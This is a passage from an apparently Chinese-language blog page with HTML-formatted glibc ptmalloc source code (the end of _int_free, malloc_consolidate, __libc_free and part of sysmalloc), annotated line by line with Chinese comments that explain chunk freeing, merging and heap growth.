fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line">    <span class="comment">//设置当前分配区的fastbin的flag,表示当前分配区的fastbin中已有空闲chunk.然后根据当前free的chunk大小获取所属的fastbin</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="comment">//fastbin double free检测</span></span><br><span class="line">	      errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">	      <span class="keyword">goto</span> errout;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">	      old_idx = fastbin_index(chunksize(old));</span><br><span class="line">	    p-&gt;fd = old2 = old;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line">    <span class="comment">//使用lock-free技术实现fastbin的单向链表插入操作</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="comment">//当前free的chunk不是通过mmap分配的,并且当前还没有获得分配区的锁,获取分配区的锁</span></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top)) &#123;</span><br><span class="line">      <span class="comment">//free的是top chunk</span></span><br><span class="line">	    errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av) &amp;&amp; (<span class="type">char</span> *) nextchunk &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>)) &#123;</span><br><span class="line">      <span class="comment">//内存中下一个chunk的地址大于top chunk的末尾</span></span><br><span class="line">	    errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk))) &#123;</span><br><span class="line">      <span class="comment">//该chunk已经是free状态</span></span><br><span class="line">	    errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">      <span class="comment">//查看下一个相邻的chunk的大小是否小于等于2 * SIZE_SZ,或是否大于分配区所分配的内存总量</span></span><br><span class="line">	    errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      <span class="comment">//如果当前free的chunk的前一个相邻chunk为空闲状态,与前一个空闲chunk合并</span></span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">//与当前free的chunk相邻的下一个chunk不是分配区的top chunk</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        <span class="comment">//如果当前free的chunk的下一个相邻chunk为空闲状态,与下一个空闲chunk合并</span></span><br><span class="line">	      unlink(av, nextchunk, bck, fwd);</span><br><span class="line">	      size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="comment">//与当前free的chunk相邻的下一个chunk处于inuse状态,清除当前chunk的inuse状态</span></span><br><span class="line">	      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) &#123;</span><br><span class="line">        <span class="comment">//unsorted_bin第一个chunk的fd的bk不是第一个chunk</span></span><br><span class="line">	      errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">	      <span class="keyword">goto</span> errout;</span><br><span class="line">	    &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size)) &#123;</span><br><span class="line">	      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line">      <span class="comment">//将合并后的chunk加入unsorted_bin的双向循环链表中</span></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//当前free的chunk下一个相邻的chunk为top chunk,则将当前chunk合并入top chunk</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="comment">//如果合并后的chunk大小大于64KB</span></span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">	      malloc_consolidate(av);</span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">	      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))</span><br><span class="line">          <span class="comment">//如果当前分配区为主分配区且top chunk的大小大于heap的收缩阈值,调用systrim函数收缩heap</span></span><br><span class="line">	        systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//为非主分配区,调用heap_trim函数收缩非主分配区的sub_heap</span></span><br><span class="line">	      heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line">	      assert(heap-&gt;ar_ptr == av);</span><br><span class="line">	      heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      <span class="comment">//有锁则对分配区解锁</span></span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//当前free的chunk是通过mmap分配则调用munma_chunk释放</span></span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="malloc_consolidate">malloc_consolidate</h2>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span> &#123;</span><br><span class="line">  mfastbinptr*    fb;</span><br><span class="line">  mfastbinptr*    maxfb;</span><br><span class="line">  mchunkptr       p;</span><br><span class="line">  mchunkptr       nextp;</span><br><span class="line">  mchunkptr       unsorted_bin;</span><br><span class="line">  mchunkptr       first_unsorted;</span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//global_max_fast不为0,表示ptmalloc已经初始化,清除分配区flag中fastbin的标志位</span></span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//将分配区最大的一个fastbin赋值给maxfb,第一个fastbin赋值给fb,然后遍历fastbin</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="comment">//获取当前遍历的fastbin中空闲chunk单向链表的头指针</span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">	      <span class="keyword">do</span> &#123;</span><br><span class="line">	        check_inuse_chunk(av, p);</span><br><span class="line">	        nextp = p-&gt;fd;</span><br><span class="line">	        size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">          nextchunk = chunk_at_offset(p, size);</span><br><span class="line">          nextsize = chunksize(nextchunk);</span><br><span class="line">          <span class="comment">//获得当前chunk的size并去除size中的PREV_INUSE和NON_MAIN_ARENA标志,获取相邻的下一个chunk和下一个chunk的大小</span></span><br><span class="line">          <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">            <span class="comment">//如果当前chunk的前一个chunk空闲则将当前chunk与前一个chunk合并成一个空闲chunk</span></span><br><span class="line">            prevsize = p-&gt;prev_size;</span><br><span class="line">            size += prevsize;</span><br><span class="line">            p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">            unlink(av, p, bck, fwd);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">            <span class="comment">//如果与当前chunk相邻的下一个chunk不是分配区的top chunk,查看与当前chunk相邻的下一个chunk是否处于inuse状态</span></span><br><span class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">            <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">              <span class="comment">//下一个chunk空闲则将当前chunk与下一个chunk合并成一个空闲chunk</span></span><br><span class="line">              size += nextsize;</span><br><span class="line">              unlink(av, nextchunk, bck, fwd);</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">              <span class="comment">//与当前chunk相邻的下一个chunk处于inuse状态,清除当前chunk的inuse状态</span></span><br><span class="line">              clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">            unsorted_bin-&gt;fd = p;</span><br><span class="line">            first_unsorted-&gt;bk = p;</span><br><span class="line">            <span class="comment">//将合并后的chunk加入unsorted_bin的双向循环链表中</span></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">              p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            p-&gt;bk = unsorted_bin;</span><br><span class="line">            p-&gt;fd = first_unsorted;</span><br><span class="line">            set_foot(p, size);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//当前chunk的下一个chunk为top chunk则将当前chunk合并入top chunk</span></span><br><span class="line">            size += nextsize;</span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            av-&gt;top = p;</span><br><span class="line">          &#125;</span><br><span class="line">	      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//直到遍历完当前fastbin中的所有空闲chunk</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">    <span class="comment">//直到遍历完所有的fastbin</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//如果ptmalloc没有初始化,初始化ptmalloc</span></span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __libc_free (<span class="type">void</span> *mem) &#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *) = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p)) &#123;</span><br><span class="line">    <span class="comment">//如果当前free的chunk是通过mmap分配的,调用munmap_chunk函数</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX) &#123;</span><br><span class="line">      <span class="comment">//如果开启了mmap分配阈值动态调整机制且chunk的大小大于设置的mmap分配阈值,小于mmap分配阈值的最大值.则将当前chunk的大小赋值给mmap分配阈值,并修改mmap收缩阈值为mmap分配阈值的2倍</span></span><br><span class="line">      mp_.mmap_threshold = chunksize (p);</span><br><span class="line">      mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">      LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>, mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">//不需要对分配区加锁,调用_int_free函数执行实际的释放工作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="sysmalloc">sysmalloc</h2>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   sysmalloc函数处理需要从系统获取更多内存的malloc情况。</span></span><br><span class="line"><span class="comment">   在进入函数时，假设av-&gt;top没有足够的空间来满足对nb字节的请求，</span></span><br><span class="line"><span class="comment">   因此需要扩展或替换av-&gt;top。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">sysmalloc</span><span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr old_top;              <span class="comment">// av-&gt;top的原始值。</span></span><br><span class="line">  INTERNAL_SIZE_T old_size;       <span class="comment">// 它的大小。</span></span><br><span class="line">  <span class="type">char</span> *old_end;                  <span class="comment">// 它的结束地址。</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> size;                      <span class="comment">// 参数给MORECORE或mmap调用。</span></span><br><span class="line">  <span class="type">char</span> *brk;                      <span class="comment">// MORECORE的返回值。</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> correction;                <span class="comment">// 参数给第二个MORECORE调用。</span></span><br><span class="line">  <span class="type">char</span> *snd_brk;                  <span class="comment">// 第二个返回值。</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T front_misalign; <span class="comment">// 新空间前面的不可用字节。</span></span><br><span class="line">  INTERNAL_SIZE_T end_misalign;   <span class="comment">// 新空间末端的部分页。</span></span><br><span class="line">  <span class="type">char</span> *aligned_brk;              <span class="comment">// 对齐的brk偏移。</span></span><br><span class="line"></span><br><span class="line">  mchunkptr p;                    <span class="comment">// 分配/返回的内存块。</span></span><br><span class="line">  mchunkptr remainder;            <span class="comment">// 分配后的剩余部分。</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;   <span class="comment">// 它的大小。</span></span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO(dl_pagesize); <span class="comment">// 系统页的大小。</span></span><br><span class="line">  <span class="type">bool</span> tried_mmap = <span class="literal">false</span>;             <span class="comment">// 标记是否尝试过mmap。</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     如果使用mmap，并且请求的大小达到mmap阈值，并且系统支持mmap，</span></span><br><span class="line"><span class="comment">     并且当前分配的mmap区域数量较少，尝试直接映射这个请求，</span></span><br><span class="line"><span class="comment">     而不是扩展top。</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.mmap_threshold)</span><br><span class="line">          &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="type">char</span> *mm;           <span class="comment">// mmap调用的返回值。</span></span><br><span class="line"></span><br><span class="line">    try_mmap:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         将大小上调到最近的页大小。对于mmapped区块，开销比普通区块多一个SIZE_SZ单位，</span></span><br><span class="line"><span class="comment">         因为没有后续区块的prev_size字段可用。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         对于glibc，没有必要进行进一步对齐，除非我们需要更高的对齐。</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">        size = ALIGN_UP(nb + SIZE_SZ, pagesize);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);</span><br><span class="line">      tried_mmap = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb))</span><br><span class="line">      &#123;</span><br><span class="line">          mm = (<span class="type">char</span> *)(MMAP(<span class="number">0</span>, size, PROT_READ | PROT_WRITE, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mm != MAP_FAILED)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 mmapped区域的开始偏移存储在区块的prev_size字段中。这允许我们在这里</span></span><br><span class="line"><span class="comment">                 和memalign()中调整返回的开始地址以满足对齐要求，并且仍然能够在</span></span><br><span class="line"><span class="comment">                 free()和realloc()中计算出正确的munmap参数地址。</span></span><br><span class="line"><span class="comment">              */</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">              &#123;</span><br><span class="line">                  <span class="comment">/* 对于glibc，chunk2mem增加地址2*SIZE_SZ，并且MALLOC_ALIGN_MASK是2*SIZE_SZ-1。</span></span><br><span class="line"><span class="comment">                     每个mmap区域都是页面对齐的，因此一定是MALLOC_ALIGN_MASK对齐的。*/</span></span><br><span class="line">                  assert(((INTERNAL_SIZE_T)chunk2mem(mm) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">                  front_misalign = <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                  front_misalign = (INTERNAL_SIZE_T)chunk2mem(mm) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">                  <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>)</span><br><span class="line">                  &#123;</span><br><span class="line">                      correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">                      p = (mchunkptr)(mm + correction);</span><br><span class="line">                      p-&gt;prev_size = correction;</span><br><span class="line">                      set_head(p, (size - correction) | IS_MMAPPED);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                      p = (mchunkptr)mm;</span><br><span class="line">                      set_head(p, size | IS_MMAPPED);</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* 更新统计数据 */</span></span><br><span class="line"></span><br><span class="line">              <span class="type">int</span> new = atomic_exchange_and_add(&amp;mp_.n_mmaps, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">              <span class="type">atomic_max</span>(&amp;mp_.max_n_mmaps, new);</span><br><span class="line"></span><br><span class="line">              <span class="type">unsigned</span> <span class="type">long</span> sum;</span><br><span class="line">              sum = atomic_exchange_and_add(&amp;mp_.mmapped_mem, size) + size;</span><br><span class="line">              <span class="type">atomic_max</span>(&amp;mp_.max_mmapped_mem, sum);</span><br><span class="line"></span><br><span class="line">              check_chunk(av, p);</span><br><span class="line"></span><br><span class="line">              <span class="keyword">return</span> chunk2mem(p);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果没有可用的arena，并且mmap也失败了。 */</span></span><br><span class="line">  <span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 记录进入时top的配置 */</span></span><br><span class="line"></span><br><span class="line">  old_top = av-&gt;top;</span><br><span class="line">  old_size = chunksize(old_top);</span><br><span class="line">  old_end = (<span class="type">char</span> *)(chunk_at_offset(old_top, old_size));</span><br><span class="line"></span><br><span class="line">  brk = snd_brk = (<span class="type">char</span> *)(MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     如果不是第一次通过，我们需要old_size至少是MINSIZE，并且设置了prev_inuse位。</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>)(old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">          prev_inuse(old_top) &amp;&amp;</span><br><span class="line">          ((<span class="type">unsigned</span> <span class="type">long</span>)old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 前提条件: 当前空间不足以满足nb请求 */</span></span><br><span class="line">  assert((<span class="type">unsigned</span> <span class="type">long</span>)(old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果av不是主arena，则尝试扩展当前堆或创建新堆。</span></span><br><span class="line">  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  &#123;</span><br><span class="line">      heap_info *old_heap, *heap;</span><br><span class="line">      <span class="type">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 首先尝试扩展当前堆。 */</span></span><br><span class="line">      old_heap = heap_for_ptr(old_top);</span><br><span class="line">      old_heap_size = old_heap-&gt;size;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">long</span>)(MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">          &amp;&amp; grow_heap(old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">          arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">          set_head(old_top, (((<span class="type">char</span> *)old_heap + old_heap-&gt;size) - (<span class="type">char</span> *)old_top)</span><br><span class="line">                   | PREV_INUSE);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap(nb + (MINSIZE + <span class="keyword">sizeof</span>(*heap)), mp_.top_pad)))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="comment">/* 使用新分配的堆。 */</span></span><br><span class="line">          heap-&gt;ar_ptr = av;</span><br><span class="line">          heap-&gt;prev = old_heap;</span><br><span class="line">          av-&gt;system_mem += heap-&gt;size;</span><br><span class="line">          arena_mem += heap-&gt;size;</span><br><span class="line">          <span class="comment">/* 设置新的 top chunk 。 */</span></span><br><span class="line">          top(av) = chunk_at_offset(heap, <span class="keyword">sizeof</span>(*heap));</span><br><span class="line">          set_head(top(av), (heap-&gt;size - <span class="keyword">sizeof</span>(*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* 释放旧的 top chunk 。 */</span></span><br><span class="line">          old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">          set_head(chunk_at_offset(old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line">          <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">              set_head(chunk_at_offset(old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">              set_foot(chunk_at_offset(old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">              set_head(old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">              _int_free(av, old_top, <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">              set_head(old_top, (old_size + <span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">              set_foot(old_top, (old_size + <span class="number">2</span> * SIZE_SZ));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (!tried_mmap)</span><br><span class="line">          <span class="comment">/* 至少可以尝试使用mmap内存。 */</span></span><br><span class="line">          <span class="keyword">goto</span> try_mmap;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>     <span class="comment">/* av == main_arena */</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">/* 请求足够的空间来满足nb + pad + 开销 */</span></span><br><span class="line">      size = nb + mp_.top_pad + MINSIZE;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         如果是连续的，我们可以减去希望与新空间合并的现有空间。</span></span><br><span class="line"><span class="comment">         我们稍后只在我们实际没有获得连续空间时再加回来。</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (contiguous(av))</span><br><span class="line">          size -= old_size;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         将大小调整为页的倍数。</span></span><br><span class="line"><span class="comment">         如果MORECORE不是连续的，这确保我们只用整页参数调用它。</span></span><br><span class="line"><span class="comment">         并且如果MORECORE是连续的，并且这不是第一次通过，</span></span><br><span class="line"><span class="comment">         